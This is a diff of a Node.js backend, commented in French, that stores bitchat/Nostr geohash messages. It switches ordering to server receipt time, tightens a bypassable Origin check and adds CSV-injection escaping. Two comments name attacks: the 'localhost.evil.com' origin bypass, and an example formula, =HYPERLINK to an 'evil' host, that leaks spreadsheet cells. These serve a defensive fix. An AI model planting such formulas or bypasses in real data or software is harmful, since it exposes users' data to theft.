@@ -105,7 +105,7 @@ db.exec(`
     is_noise INTEGER,
     relay_origin TEXT
   );
-  CREATE INDEX IF NOT EXISTS idx_events_created ON events(created_at);
+  CREATE INDEX IF NOT EXISTS idx_events_received ON events(received_at);
 `);
 // migrations : colonnes ajoutées après la création initiale de la table
 const existingCols = db.prepare(`PRAGMA table_info(events)`).all().map((c) => c.name);
@@ -116,9 +116,12 @@ const insertStmt = db.prepare(`
   INSERT OR IGNORE INTO events (id, pubkey, created_at, received_at, geohash, nickname, content, is_noise, relay_origin, location, teleported)
   VALUES (@id, @pubkey, @created_at, @received_at, @geohash, @nickname, @content, @is_noise, @relay_origin, @location, @teleported)
 `);
+// tri par received_at (horodatage serveur à l'ingestion), pas created_at (déclaré par
+// l'auteur du message -- non fiable : fuseau horaire ou horloge locale mal réglée côté
+// client bitchat peuvent faire apparaître un message avant des messages plus anciens).
 const recentStmt = db.prepare(`
-  SELECT id, pubkey, created_at, geohash, nickname, content, location, teleported FROM events
-  WHERE is_noise = 0 ORDER BY created_at DESC LIMIT ?
+  SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+  WHERE is_noise = 0 ORDER BY received_at DESC LIMIT ?
 `);
 const countStmt = db.prepare(`SELECT COUNT(*) AS n FROM events`);
 const countNoiseStmt = db.prepare(`SELECT COUNT(*) AS n FROM events WHERE is_noise = 1`);
@@ -131,7 +134,7 @@ const byGeohashStmt = db.prepare(`
 // la distance de Levenshtein n'a pas d'équivalent simple en SQL -- cf. matches() plus bas)
 const exportAllStmt = db.prepare(`
   SELECT id, pubkey, created_at, received_at, geohash, location, nickname, content, teleported FROM events
-  WHERE is_noise = 0 ORDER BY created_at ASC
+  WHERE is_noise = 0 ORDER BY received_at ASC
 `);
 const cleanupStmt = db.prepare(`DELETE FROM events WHERE received_at < ?`);
 
@@ -266,6 +269,7 @@ function toClientShape(row) {
     id: row.id,
     pubkey: row.pubkey,
     created_at: row.created_at,
+    received_at: row.received_at,
     content: row.content,
     location: row.location,
     tags,
@@ -323,11 +327,12 @@ function connectRelay(url) {
     // tag officiel bitchat ["t","teleport"] : présent quand l'auteur poste dans ce canal
     // geohash sans y être physiquement (cf. NostrProtocol.swift / GeohashMessageHandler.kt)
     const teleported = ev.tags.some((t) => t[0] === "t" && t[1] === "teleport");
+    const received_at = Math.floor(Date.now() / 1000);
     insertStmt.run({
       id: ev.id,
       pubkey: ev.pubkey,
       created_at: ev.created_at,
-      received_at: Math.floor(Date.now() / 1000),
+      received_at,
       geohash,
       nickname,
       content: ev.content ?? "",
@@ -336,7 +341,7 @@ function connectRelay(url) {
       location,
       teleported: teleported ? 1 : 0,
     });
-    if (!noise) broadcast({ ...ev, location });
+    if (!noise) broadcast({ ...ev, location, received_at });
   });
 
   // shortcut: toute la logique de reconnexion vit dans "close" — onerror est toujours
@@ -355,9 +360,20 @@ function connectRelay(url) {
 RELAYS.forEach((url, i) => setTimeout(() => connectRelay(url), i * 50));
 
 // --- serveur HTTP (backfill) + WebSocket (live), lié à 127.0.0.1 uniquement ---
+// shortcut: comparaison exacte du host (hostname + protocole), port ignoré -- un simple
+// startsWith() était contournable ("http://localhost.evil.com".startsWith("http://localhost")
+// vaut true en JS), ce qui laissait n'importe quel site web lire toute la base via ce
+// backend si l'utilisateur le visitait pendant que le backend tournait en local.
 function originAllowed(origin) {
   if (!origin) return true; // requêtes locales sans en-tête Origin (curl, etc.)
-  return ALLOWED_ORIGINS.some((o) => origin.startsWith(o));
+  let parsed;
+  try { parsed = new URL(origin); } catch { return false; }
+  return ALLOWED_ORIGINS.some((o) => {
+    try {
+      const allowed = new URL(o);
+      return parsed.protocol === allowed.protocol && parsed.hostname === allowed.hostname;
+    } catch { return false; }
+  });
 }
 
 const server = createServer((req, res) => {
@@ -407,20 +423,22 @@ const server = createServer((req, res) => {
       // "les N plus récents" ne remonte alors jamais jusqu'à un message cliqué plus
       // ancien. On centre la fenêtre sur son horodatage (moitié avant, moitié après)
       // au lieu de se baser uniquement sur le présent.
+      // centré/trié par received_at (horodatage serveur), pas created_at (déclaré par
+      // l'auteur, non fiable selon son fuseau/horloge -- cf. recentStmt plus haut).
       const half = Math.ceil(limit / 2);
       const before = db.prepare(`
-        SELECT id, pubkey, created_at, geohash, nickname, content, location, teleported FROM events
-        WHERE is_noise = 0 AND geohash = ? AND created_at <= ? ORDER BY created_at DESC LIMIT ?
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        WHERE is_noise = 0 AND geohash = ? AND received_at <= ? ORDER BY received_at DESC LIMIT ?
       `).all(geohash, around, half);
       const after = db.prepare(`
-        SELECT id, pubkey, created_at, geohash, nickname, content, location, teleported FROM events
-        WHERE is_noise = 0 AND geohash = ? AND created_at > ? ORDER BY created_at ASC LIMIT ?
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        WHERE is_noise = 0 AND geohash = ? AND received_at > ? ORDER BY received_at ASC LIMIT ?
       `).all(geohash, around, half);
       rows = [...after.reverse(), ...before]; // tri global décroissant, comme le cas sans `around`
     } else {
       rows = db.prepare(`
-        SELECT id, pubkey, created_at, geohash, nickname, content, location, teleported FROM events
-        WHERE is_noise = 0 AND geohash = ? ORDER BY created_at DESC LIMIT ?
+        SELECT id, pubkey, created_at, received_at, geohash, nickname, content, location, teleported FROM events
+        WHERE is_noise = 0 AND geohash = ? ORDER BY received_at DESC LIMIT ?
       `).all(geohash, limit);
     }
     res.setHeader("Content-Type", "application/json");
@@ -460,7 +478,15 @@ const server = createServer((req, res) => {
     res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
     if (format === "csv") {
       res.setHeader("Content-Type", "text/csv");
-      const esc = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+      // nickname/content viennent d'auteurs Nostr non authentifiés -- préfixer d'une
+      // apostrophe un champ commençant par =, +, -, @ (ou tab/CR) empêche un tableur
+      // (Excel/Sheets/LibreOffice) d'interpréter une formule piégée à l'ouverture
+      // (ex: =HYPERLINK("http://evil/leak?d="&A1)) -- mitigation standard CSV injection.
+      const esc = (v) => {
+        let s = String(v ?? "");
+        if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
+        return `"${s.replace(/"/g, '""')}"`;
+      };
       const header = "id,pubkey,created_at,received_at,geohash,location,teleported,nickname,content\n";
       const body = rows.map((r) =>
         [r.id, r.pubkey, r.created_at, r.received_at, r.geohash, r.location, r.teleported ? "oui" : "non", r.nickname, r.content].map(esc).join(",")
